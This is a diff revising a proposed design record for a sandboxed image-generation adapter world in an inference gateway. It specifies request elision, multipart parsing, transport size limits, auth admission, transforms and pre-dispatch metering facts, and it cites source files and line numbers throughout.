@@ -4,27 +4,29 @@ Status: **proposed — drafted for review by the host team (token-station-server
 
 Date: 2026-09-30
 
+Revised: 2026-10-01 after independent review (see the revision note at the end).
+
 Rulings: on 2026-09-30 the host owner (lv) ruled on Q4, Q7, Q10 and Q13 (§17), each as recommended. Q4 also needs
 the south maintainers. Questions decided by the south maintainers remain open.
 
 
-Baseline: south `origin/main` = `3135e36` (v0.42.0). Server line numbers come from the local checkout `8b2a1976`
-(dev-v2 merged in up to `5e7816a3`); P22 / P18 were written at `d672b945` / `b660ea3f`, so their line numbers have
-drifted — re-verify in place before citing. Kernel line numbers come from the `token-station-protocol` revision south
-pins, `f585bc8` (`Cargo.toml:22`).
+Baseline: south `main` = `3c1501a` (its code is identical to v0.42.0, `3135e36`; the merge added only design
+records). Server line numbers come from host `a82c852b`; P22 / P18 were written at `d672b945` / `b660ea3f`, so their
+line numbers have drifted — re-verify in place before citing. Kernel line numbers come from the
+`token-station-protocol` revision south pins, `f585bc8` (`Cargo.toml:22`).
 
 Citation convention: a south file name without a directory refers to this repository's crate sources — `lib.rs` and
 `task_v2.rs` are in `crates/south-contracts/src/`; `manifest.rs` is in `crates/south-provider-api/src/` and `*.wit` in
 `crates/south-provider-api/wit/`; `component.rs`, `runtime.rs`, `bindings.rs` and `loader.rs` are in
 `crates/south-provider-runtime/src/`; `task_suite_v2.rs`, `report.rs`, `component_v2.rs` and `reference_*.rs` are in
-`crates/south-component-conformance/src/`. The kernel's `http.rs` and `usage.rs` are in `token-station-protocol`'s
-`crates/protocol/src/`. Server file names are abbreviated relative to `gateway/src/modules/`: `handlers.rs`,
-`precheck.rs`, `execute.rs`, `durable.rs`, `gemini.rs`, `azure.rs`, `minimax.rs`, `bailian.rs`, `ideogram.rs`,
-`stability.rs`, `xai.rs` and `openai_compat.rs` are in `inference/handler/images/`; `reve.rs` is in
-`inference/handler/`; `media.rs` is in `inference/engine/token_counter/`; `capabilities.rs` is in `inference/engine/`;
-`webhook_sender.rs`, `domain.rs` and `repo/reconcile.rs` are in `tasks/`; `usage_types.rs` is in
-`crates/gateway-provider-protocol/src/`, `models.rs` in `gateway/src/infra/config/`, and `core/limits.rs` in
-`gateway/src/`.
+`crates/south-component-conformance/src/`. `south-core`'s own `lib.rs` is always written `south-core/src/lib.rs`. The
+kernel's `http.rs` and `usage.rs` are in `token-station-protocol`'s `crates/protocol/src/`. Server file names are
+abbreviated relative to `gateway/src/modules/`: `handlers.rs`, `precheck.rs`, `execute.rs`, `durable.rs`, `gemini.rs`,
+`azure.rs`, `minimax.rs`, `bailian.rs`, `ideogram.rs`, `stability.rs`, `xai.rs` and `openai_compat.rs` are in
+`inference/handler/images/`; `reve.rs` is in `inference/handler/`; `media.rs` is in `inference/engine/token_counter/`;
+`capabilities.rs`, `body_cap.rs` and `south_adapter.rs` are in `inference/engine/`; `webhook_sender.rs`, `domain.rs`
+and `repo/reconcile.rs` are in `tasks/`; `usage_types.rs` is in `crates/gateway-provider-protocol/src/`, `models.rs`
+in `gateway/src/infra/config/`, and `core/limits.rs` in `gateway/src/`.
 
 Predecessors:
 `2026-09-09-multipart-request-body.md` (0.25.0: multipart is only opaque bytes; South has no part model and does not
@@ -36,7 +38,8 @@ fetch, not a provider call"),
 `2026-09-27-task-contract-v6-facts.md` (request estimate facts, `immutable_body_paths`),
 `2026-09-28-task-contract-v7-artifact-role.md` (no reservation for values without a consumer),
 `2026-09-30-host-zero-vendor-boundary.md` (this record relies on its §3 credential recipe, §4.2 descriptor auth
-admission, §6.3 host checks and undetectable zone, and §8 compatibility range).
+admission, §6.3 host bounds, host checks and undetectable zone, its §6.4 rule that a `rejected` outcome releases
+the reservation, and §8 compatibility range).
 
 Origin: token-station-server P21 (DP0 / DP1 decided; group-B decisions "as recommended"), P22 (DI1–DI6), P18 (D1–D6).
 Sibling records: `2026-09-30-speech-world.md` (reuses this record's §6 media vocabulary and §11 safe fetch executor
@@ -51,7 +54,7 @@ told apart by `provider_config.name == "xai"`, `handlers.rs:143`, `openai_compat
 has four providers with translation logic (Gemini, Reve, Azure Foundry, xAI JSON edit) plus an OpenAI-compatible byte
 pass-through. Before dispatch there is also per-provider admission: the Nano Banana tier gate (`precheck.rs:34-62`),
 the mapping from input-image keys to roles (`precheck.rs:88-155`), and the xAI upper-bound branch
-(`execute.rs:156-190`). P21 DP0 requires zero provider logic in the host, so all of these must move into components.
+(`execute.rs:181-187`). P21 DP0 requires zero provider logic in the host, so all of these must move into components.
 
 South today has no world that can hold them:
 
@@ -72,12 +75,14 @@ One more hard constraint is often overlooked: by default the runtime limits each
 component are serialized through the same instance (`component.rs:136`, `:674-686`). A gpt-image-class b64 response
 with n=10 exceeds 16 MiB, and a high-resolution Gemini `inlineData` approaches it; the request body limit for
 multipart edits is 100 MiB (`lib.rs:115`). "Hand the bytes to the component" is not solved by changing the WIT alone.
+The transport has limits of its own, below the host's (§6.3a).
 
 ## 2. Scope and boundary statement
 
-**In scope**: world shape and functions; byte handling for requests and responses; artifact forms and delivery order;
-metering facts and host generic checks; pre-dispatch facts; the division of labour on pricing form; how the
-GatewayHeld path connects; the conformance suite and host obligations; migration order and dual-run acceptance.
+**In scope**: world shape and functions; byte handling for requests and responses; the transport sizing the image
+surface needs; artifact forms and delivery order; metering facts and host generic checks; pre-dispatch facts; the
+division of labour on pricing form; how the GatewayHeld path connects; the conformance suite and host obligations;
+migration order and dual-run acceptance.
 
 **Out of scope**: the host executor's implementation; the values of any price or reservation formula; the two
 asynchronous arms Wan / GMI (task world, P13 S14); Bailian's native image surface and Reve's three native routes
@@ -88,7 +93,9 @@ recipe v1 in the boundary record §3, phase B4 there — this world only consume
 credential sources. This world only lets a component say, as a **pure function**, "what the request looks like and
 what facts the response contains". The host holds the bytes; the component describes, by **reference**, where the
 bytes are and which public standard encodes them (§6). That confines the host's new responsibilities to what P21 §1.1
-allows: "generic executors for public standards, selected by component declaration".
+allows: "generic executors for public standards, selected by component declaration". Every transform two hosts must
+execute identically is a south pure function with golden vectors (§6.7), so "generic executor" never means "each host
+writes its own".
 
 ## 3. D1 — Generation and edit share one world (DI1)
 
@@ -121,13 +128,13 @@ the product is presented through a `minted` slot as `bearer` (boundary record §
 **Auth arms**: the first version admits `bearer` and `header_secret`. The header names required are all already in
 the closed set: `api-key` (Azure Foundry, Ideogram; header names are case-insensitive) and `x-goog-api-key` (Gemini)
 (`lib.rs:884-894`). Minted credentials (Vertex) need no arm of their own: they arrive through a `minted` slot and are
-presented as `bearer`, and the host admits the descriptor's auth by the descriptor auth rule of the boundary record
-§4.2. This world does not admit the `oauth` arm, which the boundary record proposes to deprecate (§3.7 there);
-`host_signed` has no consumer and is not admitted. Runtime loading needs one change with it: the host import is
-currently linked on `api_version != TASK_WORLD_V2` (`component.rs:182`). This world, the speech world and the
-embeddings world all come without a `host` import, so the condition should become a world property rather than an
-enumerated exclusion, and the import scan should refuse any `host` namespace for these worlds, as `loader.rs:216-224`
-does for task-v2 (the embeddings record §4 does the same).
+presented as `bearer`, and the host admits the descriptor's auth by the rules of the boundary record §4.2, applied to
+this world's descriptor type (§6.3). This world does not admit the `oauth` arm, which the boundary record proposes to
+deprecate (§3.8 there); `host_signed` has no consumer and is not admitted. Runtime loading needs one change with it:
+the host import is currently linked on `api_version != TASK_WORLD_V2` (`component.rs:182`). This world, the speech
+world and the embeddings world all come without a `host` import, so the condition should become a world property
+rather than an enumerated exclusion, and the import scan should refuse any `host` namespace for these worlds, as
+`loader.rs:216-224` does for task-v2 (the embeddings record §4 does the same).
 
 **Not recommended, but awaiting a ruling: one "synchronous media world" holding both image and speech (and even
 embeddings).** This is the alternative that P22 / P23 / P24 never compared against one another when each decided to
@@ -154,34 +161,63 @@ into a new `south-contracts` module, `media` (shared by image and speech; contra
 ### 6.1 The request view the host gives the component: `MediaRequestViewV1`
 
 - JSON northbound request: the host gives the **elided** JSON (§6.2).
-- Multipart northbound request (the edit surface, ASR): the host uses a generic parser to split it into an **ordered**
-  part list `parts: [{name, kind: "text", value} | {name, kind: "file", blob, filename?, media_type?, bytes}]`, keeping
+- Multipart northbound request (the edit surface, ASR): the host splits it into an **ordered** part list
+  `parts: [{name, kind: "text", value} | {name, kind: "file", blob, filename?, media_type?, bytes}]`, keeping
   repeated fields in order of appearance. File parts appear only as a `blob` reference; their bytes do not enter the
-  sandbox. The host's multipart tooling today only scans and replaces in place and never splits out file parts
-  (`inference/handler/audio/multipart.rs:560-683`); a complete generic part parser is needed here — P21 already
-  classifies "multipart parsing" as host generic logic.
+  sandbox. A text part longer than the fallback threshold (§6.2) is elided the same way — it becomes
+  `{name, kind: "text", blob, bytes, head}` — so a huge text field cannot push the view past the runtime payload
+  limit. The host's multipart tooling today only scans and replaces in place and never splits out file parts
+  (`inference/handler/audio/multipart.rs:560-683`). The splitter is a parser both hosts must run identically, so south
+  supplies it: `parse_multipart_parts_v1` in `south-contracts::media` (§6.7).
 - The host must not hand over any key starting with `$south.`: its appearance in northbound JSON is a 400 (placeholder
   namespace, §6.2).
 
-### 6.2 Elision rules (deterministic; both hosts must execute them identically, byte for byte)
+### 6.2 Elision rules and `elide_v1` (deterministic; both hosts produce the same view byte for byte)
 
-A JSON string is replaced by the placeholder `{"$south.blob": {"id": …, "bytes": …, "head": …}}` in two cases (`head`
-is the first 64 bytes, truncated at a UTF-8 boundary, so the component can recognise a prefix such as
-`data:image/png;base64,` without getting the content):
+Both hosts must produce the same view from the same document, so the rules below are not a specification each host
+implements: south supplies them as one pure function in `south-contracts::media`,
+
+```text
+elide_v1(document: &[u8], declared: &[PathPatternV1], limits: &MediaLimitsV1)
+    -> Result<(ElidedViewV1, Vec<BlobV1>), ElisionErrorV1>
+```
+
+with golden vectors shipped next to it and the same fuzz obligation as every other grammar in `south-contracts`. The
+host calls it (or, if it cannot link Rust, reproduces every golden vector byte for byte — host obligation §12.3).
+
+A JSON string is replaced by the placeholder `{"$south.blob": {"id": …, "bytes": …, "head": …}}` in two cases:
 
 1. **Declared paths**: path patterns the component declares in `model-capabilities` (request side) and in the result of
    `prepare` (response side) — RFC 6901 JSON Pointers in which a `*` segment matches any array index or key, e.g.
    `/image_url`, `/images/*/url`, `/data/*/b64_json`, `/candidates/*/content/parts/*/inlineData/data`. At most 32
    entries, each ≤ 256 bytes. A match is elided **regardless of length**.
-2. **Fallback threshold**: any string, at any position, longer than `MEDIA_MAX_INLINE_STRING_BYTES` (suggested
+2. **Fallback threshold**: any string value, at any position, longer than `MEDIA_MAX_INLINE_STRING_BYTES` (suggested
    1 MiB). It guarantees that the view stays within the runtime payload limit, and gives the component a deterministic
    shape to refuse when a huge string turns up at an undeclared position (for example, a prompt above 1 MiB is refused
    as `invalid_request`).
+
+What `elide_v1` fixes, so that nothing is left to a host's choice:
+
+- **Traversal**: depth first, in source order; object members keep their source order (the view is not re-sorted).
+  A document with a duplicate object key is refused (`ElisionErrorV1::DuplicateKey`; the host answers 400 on the
+  request side and `unknown` on the response side).
+- **Ids**: `b0`, `b1`, … in traversal order; on the multipart side, one sequence over file parts and elided text parts
+  in part order. Ids are local to one view.
+- **`bytes`**: the length in bytes of the **decoded** string value (UTF-8, after JSON unescaping). **`head`**: the first
+  64 bytes of the decoded value, truncated back to a UTF-8 boundary, so the component can recognise a prefix such as
+  `data:image/png;base64,` without getting the content.
+- **Keys** are never elided; an object key longer than the threshold refuses the document.
+- **Serialization of the view**: compact (no insignificant whitespace), members in source order, and every number
+  copied as its source text, so a number is never re-rounded on the way through.
 
 If the elided view still exceeds the runtime `max_payload_bytes`: on the request side the host returns 413 / 400
 before admission; on the response side the round is `unknown` (§9.2) — no settlement, no refund. The threshold is
 1 MiB rather than smaller because legitimate text approaches tens of KiB (a 32,000-character CJK prompt is about
 96 KB): eliding text the component needs to read would break the request.
+
+A component that passes a value through unchanged (the OpenAI-compatible fallback copies the whole request) re-emits
+each elided node as `{"$south.ref": {"blob": "<id>", "transform": "as_is"}}` (§6.3). A `$south.blob` node in any
+component output is refused (`reference_integrity`, §12.1).
 
 ### 6.3 The request descriptor the component gives the host: `MediaRequestDescriptorV1`
 
@@ -190,24 +226,71 @@ carry a JSON body:
 
 | Field | Form |
 |---|---|
-| `method` | `POST` or `GET` |
-| `path` | A relative path following the `RelativePathV1` grammar (`lib.rs:479`); the host authorizes it against the configured endpoint (EndpointConfinement) |
+| `method` | `POST` only. The earlier draft also allowed `GET`; no image or speech call needs it (second hops are host fetches, §11), and there is no binary-response GET to execute it with (`south-core/src/lib.rs:845-850`), so by task contract 7's rule it is not reserved |
+| `path` | A relative path following the `RelativePathV1` grammar (`lib.rs:481`); the host authorizes it against the configured endpoint (EndpointConfinement) |
 | `query` | Only the closed `QueryParameterV1` set (`lib.rs:1064-1090`; the image surface uses `GroupId` and `api-version`) |
 | `headers` | `SafeHeaders` rules; a multipart body must not carry `content-type` (same rule as `lib.rs:1615`) |
-| `auth` | One of the auth arms the manifest declares; the host admits it by the descriptor auth rule of the boundary record §4.2 |
-| `body` | `json {template}` / `multipart {parts}` / `empty` |
+| `auth` | `MediaAuthV1`: `{"arm": "bearer", "slot": "<slot>"}` or `{"arm": "header_secret", "header": "<name>", "slot": "<slot>"}`; the arm must be one the manifest declares, and the header one of `SecretHeaderV1` |
+| `body` | `json {template}` / `multipart {parts}` / `text {media_type, text}` / `empty` (`text` is the speech world's SSML body; it is part of `contracts.media` v1, §6.4, and no image component uses it) |
+
+**Auth admission.** `MediaAuthV1` maps one to one onto the contract's `ProviderAuthV1::Bearer` / `HeaderSecret`
+(`lib.rs:1309-1323`). The boundary record §4.2 specifies admission as a function over the kernel descriptor's `Auth`,
+which this descriptor does not carry (the kernel descriptor also carries an absolute `url`, kernel `http.rs:350-361`).
+South therefore provides a twin, `admit_media_descriptor_auth(manifest, config, &MediaRequestDescriptorV1)`, in the
+same crate and built on the same rule implementation, so the two cannot drift: the arm must be declared, the header
+must be admitted, a `minted` slot is presented as `bearer`, and any mismatch is refused before admission.
 
 `json.template` is plain JSON in which reference nodes `{"$south.ref": {"blob": "<id>", "transform": "<word>"}}` may
 appear; the host replaces each with the transformed JSON string. `multipart.parts` is an ordered list:
-`{name, value: "<text>"}` or `{name, blob, transform, filename?, media_type?}`. The host encodes the list
-**generically** into `MultipartBodyV1` (the boundary is supplied by the host; contracts do not touch randomness), then
-goes through the existing `MultipartPostRequestV1` / `execute_multipart_call_v1`. Every request shape on the image
-surface falls within the three that HTTP contract 9 already has (JSON POST, multipart POST, JSON POST with a binary
-response); **no** new transport shape is needed.
+`{name, value: "<text>"}` or `{name, blob, transform, filename?, media_type?}`. The host encodes the list with south's
+encoder into `MultipartBodyV1` (the boundary is supplied by the host; contracts do not touch randomness, §6.7).
+
+**Expansion happens before admission.** On both paths — including the GatewayHeld path, before its 202 — the host
+expands every reference, encodes the body and builds the transport request (`JsonBodyV1` / `MultipartBodyV1`) before
+admission, so every size refusal in §6.3a is a pre-admission 413 that moves no money.
+
+### 6.3a Transport sizing: one new shape, HTTP contract 9 → 10
+
+The earlier draft said every image request falls within the three shapes HTTP contract 9 already has and that no new
+transport shape is needed. **That is withdrawn.** The shapes exist; their size limits do not fit the image surface:
+
+| Limit | South | Host today | Consequence |
+|---|---|---|---|
+| JSON request body | 32 MiB (`MAX_JSON_REQUEST_BODY_BYTES`, `lib.rs:106`, enforced at `lib.rs:620`) | multipart edits up to 100 MiB (`core/limits.rs:12`) | an edit whose component inlines input images as base64 JSON (Gemini, Reve) can exceed 32 MiB |
+| UTF-8 response body | 32 MiB (`MAX_RESPONSE_BODY_BYTES`, `lib.rs:121`) | 64 MiB success-body cap (`UPSTREAM_JSON_BODY_CAP`, `body_cap.rs:27`) | a b64 response between 32 and 64 MiB is refused **after** dispatch |
+| Binary response body | 64 MiB (`MAX_BINARY_RESPONSE_BODY_BYTES`, `lib.rs:131`), JSON POST only (`execute_binary_call_v1`, `south-core/src/lib.rs:858`) | — | no multipart POST can read its response as bytes |
+
+The response side is the serious one. The host already recorded why: a south refusal in the 32–64 MiB window happens
+after dispatch, becomes `delivery_unknown`, and the manual review's answer is foregone — the upstream succeeded and
+charged (`south_adapter.rs:833-841`). That is exactly the case "a failed delivery the customer is charged for" that
+§10.2 exists to avoid.
+
+**Rules for this world:**
+
+1. **Every media-world call reads its response as bytes.** The host builds the response view itself (§6.5) and
+   decodes UTF-8 / JSON outside the sandbox, so the UTF-8 entry points are never used here and the 32 MiB response
+   window disappears for JSON POST, which already has `execute_binary_call_v1`.
+2. **New shape: multipart POST with a binary response.** `execute_multipart_call_v1` reads UTF-8
+   (`south-core/src/lib.rs:811-831`), and 0.26.0 declined a binary multipart twin because "no multipart call site
+   answers in bytes" (`south-core/src/lib.rs:845-850`). The image edit surface is such a call site in effect: the
+   OpenAI-compatible, Azure and Stability edits are multipart requests whose JSON answer carries up to ten b64 images.
+   **Proposal**: add `execute_multipart_binary_call_v1` (same request type, response buffered as bytes up to
+   `MAX_BINARY_RESPONSE_BODY_BYTES`) and its raw twin, following the 0.25.0 / 0.26.0 additive precedents.
+   **One bump, `HTTP_CONTRACT_VERSION` 9 → 10, released in this world's minor, carries both new shapes**: this twin
+   and the speech record's D3a `TextPostRequestV1` with its binary execution entry point. The ASR arms use this twin
+   too (speech §5), since every media-world call reads its response as bytes (rule 1). Open question Q14 (S).
+3. **Request side: no new shape.** A JSON body above 32 MiB is refused before admission (413) after expansion. The
+   32 MiB bound is below the northbound 100 MiB, so some large inlined edits that a native arm without a south plan
+   would send are refused; the upstreams concerned document inline request limits well below 32 MiB (inferred from
+   their public documentation, to be confirmed per component), so raising the JSON limit buys nothing. Any refusal of
+   this kind seen in the dual run is recorded (§14).
+
+Raising `MAX_RESPONSE_BODY_BYTES` to 64 MiB instead was considered and rejected (§16): it would change the bound on
+every text path to fix a media-only need.
 
 ### 6.4 Closed transforms `MediaTransformV1`
 
-All are public standards, named by the component and implemented once by each host (P21 §1.1):
+All are public standards, named by the component and implemented once, by south, as pure functions (§6.7):
 
 | Word | Input → output | Use on the image surface |
 |---|---|---|
@@ -217,23 +300,28 @@ All are public standards, named by the component and implemented once by each ho
 | `from_data_url` | data URL string → bytes | the client sends a data URL, the upstream wants a multipart file part |
 | `from_base64` | base64 string → bytes | same, with the client sending bare base64 |
 
-The speech surface adds `from_hex`, `concat` and `wav_pcm_s16le{rate, channels}` (see the speech record §6). The set
-is closed: adding a word is a `contracts.media` version change.
+**`contracts.media` v1 carries the whole vocabulary both media worlds need, released once**: the five words above,
+the speech words `from_hex`, `concat` and `wav_pcm_s16le{sample_rate, channels}` (speech record §6), the `text`
+request body (§6.3; speech D3a) and the `sse` response body form (§6.5). The set is closed: adding a word after that
+release is a `contracts.media` version change. The earlier draft declared `media: 1` in both records while speech
+added words to it; releasing the full vocabulary together removes that contradiction.
 
-### 6.5 The response view `MediaResponseViewV1` and the response framing declaration
+### 6.5 The response view `MediaResponseViewV1` and `response_body_form`
 
-In `prepare` the component declares this response's framing: `json | binary | text` (the speech surface adds `sse`).
-It follows the rule of P21 S4 — the component names a form from a closed set and the host implements each form once —
-but it is a media-world vocabulary carried in `contracts.media`, not the provider world's stream framing
-(`stream_framing`, boundary record §5.2: `bytes | aws-eventstream`). That record declines `sse` because provider-world
-components receive raw chunks and split SSE themselves; in this world the body stays out of the sandbox (§6), so the
-host builds the view and therefore does the splitting.
+In `prepare` the component declares this response's body form, `response_body_form`: `json | binary | text | sse`
+(`sse` is used by the speech world). The earlier draft called this "framing"; it is renamed so it cannot be confused
+with the provider world's `stream_framing` (boundary record §5.2: `bytes | aws-eventstream`). It follows the rule of
+P21 S4 — the component names a form from a closed set and the host implements each form once. That record declines
+`sse` because provider-world components receive raw chunks and split SSE themselves; in this world the body stays out
+of the sandbox, so the host builds the view and therefore does the splitting, with south's `decode_sse_v1`, which
+lives in `south-contracts` as the SSE sibling of the eventstream deframer (boundary record §5.2) and is released with
+this world's minor.
 
 From the declaration the host provides `{status, headers, body}`, where `body` is `{"json": <elided view>}`,
 `{"text": "…"}` (≤ the fallback threshold), or `{"opaque": {"blob", "bytes", "media_type"}}` (binary, or over the
 limit). A non-2xx body is tried as UTF-8 to give `json` / `text`, otherwise `opaque`. If a key prefixed with `$south.`
 appears in the upstream body, the host judges the round `unknown` and does not hand it to the component (so an
-upstream cannot forge references). `headers` follows the exclusion rules of `ResponseTranscriptV1` (`lib.rs`
+upstream cannot forge references). `headers` follows the exclusion rules of `ResponseTranscriptV1` (`lib.rs:193`,
 `RESPONSE_TRANSCRIPT_DENIED_HEADERS`) and contains no credential-class headers.
 
 ### 6.6 Relation to the 0.25.0 ruling: what agrees and what is revised
@@ -241,29 +329,34 @@ upstream cannot forge references). `headers` follows the exclusion rules of `Res
 P22 I1 says option B "agrees with south 0.25.0's ruling that 'South does not encode multipart'". **That is only half
 right**:
 
-- **Agrees**: the transport contract is unchanged. `MultipartBodyV1` is still encoded opaque bytes, and "This contract
-  does not parse multipart" (`lib.rs:740`) still holds.
+- **Agrees**: the transport contract is unchanged in kind. `MultipartBodyV1` is still encoded opaque bytes, and "This
+  contract does not parse multipart" (`lib.rs:745`) still holds for the transport type.
 - **Revised**: one of 0.25.0 D2's reasons was "South also has no business learning what a form field is"
-  (`2026-09-09-multipart-request-body.md:203-208`). Under option B the component must state part names, file names and
-  media types in the world vocabulary — so South's **world layer** starts knowing what a form field is. This record
-  explicitly narrows that sentence's scope: it continues to bind the transport layer, not the world layer.
+  (`2026-09-09-multipart-request-body.md:201-207`). Under option B the component must state part names, file names and
+  media types in the world vocabulary, and south supplies the part parser and the encoder (§6.7) — so South's
+  **world layer** starts knowing what a form field is. This record explicitly narrows that sentence's scope: it
+  continues to bind the transport layer, not the world layer.
 
 One more argument 0.25.0 made does not hold here: it required **byte-for-byte** agreement with the host's old path,
 because the host already had a correctly encoded body and only replaced in place. Once the component builds the body,
 the host has changed encoders and the boundary necessarily differs, so the dual run can only compare **decoded part
 lists** (§14).
 
-### 6.7 D3b — Where the encoder lives
+### 6.7 D3b — Where the parser, the encoder, the elider and the transforms live
 
 - **A — each host writes its own**: matches the letter of 0.25.0's "South ships no encoder", but the community host
-  and the server each write one, the encoding details (part header order, line breaks, file-name escaping) drift, and
-  the conformance suite cannot assert anything about the encoded result.
-- **B — south provides host-side pure functions** (recommended): `south-core` (or `south-contracts::media`) provides
-  `encode_multipart_v1(parts, resolved_blobs, boundary) -> MultipartBodyV1`, with no I/O and no randomness (the caller
-  supplies the boundary). It runs **outside** the sandbox, so large bytes still never enter wasm; both hosts share one
-  implementation, and the suite can assert byte for byte on the encoded result. Cost: it overturns the half-sentence
-  "South gains no … encoder" of 0.25.0 §2, which needs a ruling from the south maintainers (§17 Q1). Transforms such
-  as `base64` / `data_url` likewise; the suggestion is to provide them as pure functions in the same place.
+  and the server each write one, the details (part order, part header order, line breaks, file-name escaping, elision
+  ids) drift, and the conformance suite cannot assert anything about the results.
+- **B — south provides host-side pure functions** (recommended): `south-contracts::media` provides
+  `parse_multipart_parts_v1` (§6.1), `elide_v1` (§6.2), `encode_multipart_v1(parts, resolved_blobs, boundary) ->
+  MultipartBodyV1` and the transforms of §6.4, with no I/O and no randomness (the caller supplies the boundary). They
+  go in `south-contracts`, not `south-core`, because `south-core` introduces no parsing grammar and every grammar
+  lives in `south-contracts` under its fuzz obligations (`south-core/src/raw.rs:11-13`). They run **outside** the
+  sandbox, so large bytes still never enter wasm; both hosts share one implementation, and golden vectors let the
+  suite assert byte for byte on every result. Cost: it overturns the half-sentence "South gains no … encoder" of
+  0.25.0 §2 and adds a multipart parser, which needs a ruling from the south maintainers (§17 Q1). The SSE
+  decoder `decode_sse_v1` that the speech world needs follows the same reasoning and also lives in `south-contracts`
+  (boundary record §5.2).
 
 ## 7. D4 — Function set
 
@@ -282,7 +375,8 @@ interface image-adapter {
     metadata: func() -> adapter-metadata;
     healthcheck: func() -> adapter-health;
 
-    // ProviderConfig -> list<ImageModelCapabilitiesV1>. Static per package digest.
+    // ProviderConfig -> list<ImageModelCapabilitiesV1>.
+    // Deterministic in (package digest, provider config).
     model-capabilities: func(provider-config: json) -> result<json, json>;
 
     // ProviderConfig, MediaRequestViewV1, ImageCallContextV1 -> PreparedImageCallV1.
@@ -303,34 +397,56 @@ world image-adapter-v1 {
 ```
 
 - **`model-capabilities`**: static per-model declarations — supported operations, input roles and limits (§8),
-  renderable `response_format`s, the metering forms it will report (§9.1), the tier words that may appear, and
-  request-side elision paths. The host may cache the result by package digest. When the host routes aliases or
-  private deployments and the component cannot tell from the model name, follow the precedent of
-  `2026-09-29-claude-model-dialect.md`: the catalog declares words in `ProviderConfig.models[].supported_parameters`
-  and the component reads them (the dialect-word mechanism of the boundary record §7.4).
+  renderable `response_format`s, the metering forms and token buckets it will report (§9.1), the tier dimensions that
+  may appear with each dimension's default word (§8), and request-side elision paths. The result depends on the
+  provider config as well as on the package (the catalog's `supported_parameters` words and other non-secret
+  configuration), so the host caches it under the key **(package digest, digest of the canonical provider-config
+  JSON)**, never under the package digest alone. When the host routes aliases or private deployments and the
+  component cannot tell from the model name, follow the precedent of `2026-09-29-claude-model-dialect.md`: the
+  catalog declares words in `ProviderConfig.models[].supported_parameters` and the component reads them (the
+  dialect-word mechanism of the boundary record §7.4).
 - **`prepare`**: a pure function the host calls **before admission and reservation**; it returns the pre-dispatch
-  facts (§8), the request descriptor (§6.3), `repeat`, the response framing and elision paths, `immutable_body_paths`
-  (same semantics as task contract 6 §4), and a bounded `state` (≤ 8 KiB, no secrets, for use by the two later
-  functions).
+  facts (§8), the request descriptor (§6.3), `repeat`, the `response_body_form` and response elision paths,
+  `immutable_body_paths` (same semantics as task contract 6 §4), and a bounded `state` (≤ 8 KiB, no secrets, for use
+  by the two later functions).
 - **`parse-response`**: called once per upstream round; returns one of the four outcomes of §9.2. Error mapping is
   merged in here, with no separate `map-provider-error`: on the synchronous image surface only the component can tell
   "failed but charged" from "failed and not charged" (MiniMax's errors arrive as HTTP 200 + `base_resp`,
-  `minimax.rs:356-369`).
+  `minimax.rs:356-369`). Because error mapping lives here, the auth-error rule of the provider world applies here too
+  (§12.1).
 - **`render`**: takes the outcomes of all succeeded rounds and the render context the host provides (the `created`
   timestamp and so on — the component has no clock), and produces a client-body template in which artifact positions
   are written as `{"$south.artifact": {"index": i, "as": "b64_json" | "url"}}` for the host to fill in. It lives in the
   component rather than in generic host rendering for two reasons: the OpenAI-compatible fallback today returns the
   upstream body to the client unchanged (`handlers.rs:650-656`), and generic host rendering would lose fields such as
   `usage`, `background` and `output_format`; and Gemini produces only one image per call, so n images take n loops
-  (`gemini.rs:314`), and aggregating n rounds must happen in one function. Same precedent as the task world's
+  (`gemini.rs:323`), and aggregating n rounds must happen in one function. Same precedent as the task world's
   `render-success` (`task-adapter-v2.wit:53-58`).
+
+**Allowed artifact deliveries** (closed; §10.1 defines the forms):
+
+| Artifact form | `as: "b64_json"` | `as: "url"` |
+|---|---|---|
+| `inline` | yes (host decodes and re-encodes as plain base64) | **no** in v1 |
+| `body` | yes | **no** in v1 |
+| `url` | yes (host fetches through §11) | yes (host passes the URL through) |
+
+`inline` / `body` → `url` would need the host to store the bytes and mint a URL on the synchronous path. No arm does
+that today — Azure and Stability refuse a `url` response format outright (`azure.rs:200-227`,
+`stability.rs:119-145`) — so by task contract 7's rule it is not reserved. A component whose upstream cannot serve the
+requested `response_format` refuses in `prepare` (`invalid_request`), as those arms do today.
+
+**`render` failing after the upstream succeeded** (an `Err`, a template that violates the table above, or one that
+fails `reference_integrity`): the upstream has produced and may have charged, so the call is `unknown` — the
+synchronous path records `delivery_unknown`, the held path parks it, and there is **no** `finalize`. It is never
+treated as a pre-dispatch refusal.
 
 **`repeat`**: `prepare` may declare that one descriptor is sent k times (1 ≤ k ≤ 10), only for "one image per call"
 upstreams such as Gemini / Vertex. The host executes the rounds sequentially and stops at the first non-succeeded
 round. The aggregation rule is part of the contract: round 1 `rejected` → the whole call is `rejected`; any
 non-success from round 2 on → the whole call is `unknown` (earlier rounds were already charged; consistent with
-today's `DispatchProbe` being set only when `i==0`, `gemini.rs:385`). "k different descriptors" is not offered: there
-is no consumer.
+today's `DispatchProbe` being set only when `i==0`, `gemini.rs:394-396`). "k different descriptors" is not offered:
+there is no consumer.
 
 ## 8. D5 — Pre-dispatch facts (each item P22 I1 lists, landed)
 
@@ -342,10 +458,32 @@ is no consumer.
 | `inputs` | counts per role `{input_image, reference_image, mask}`; closed vocabulary | `precheck.rs:88-155` interpreting keys and roles by `provider_type` |
 | `requested_outputs` | image count sent upstream × `repeat` | the per-arm branches where the host parses `n` itself |
 | `size` | `{width, height}`, when it can be determined | `image_size_hint` in `media.rs:31-36` |
-| `tier` | tier words `{resolution?, quality?, speed?}`, grammar `[a-z0-9_.-]{1,32}` | xAI's `size→resolution` normalisation (`xai.rs:338-409`), Ideogram's speed tier (`ideogram.rs:62-72`) |
-| `tier_candidates` | `{candidates: [...], default}`: the candidate set when the upstream decides the tier | the xAI candidate price cards (`media.rs:994-1040`) |
-| `metering_forms` | the metering forms that must be reported on success (§9.1) | half the job of the four copies of "is this token-priced" (§9.3) |
-| `reservation` | quantity upper bounds: `max_images`, `max_tokens{text_input, image_input, output}?`, `max_credits?` | the xAI branch in `execute.rs:156-190`; the `body_len` approximation in the token bound |
+| `tier` | tier words by dimension `{resolution?, quality?}`, grammar `[a-z0-9_.-]{1,32}` | xAI's `size→resolution` normalisation (`xai.rs:338-409`), the Nano Banana resolution gate (`precheck.rs:34-62`) |
+| `tier_candidates` | `{candidates: [...], default}`: the candidate set when the upstream decides the tier | the xAI candidate price cards (`media.rs:994-1025`) |
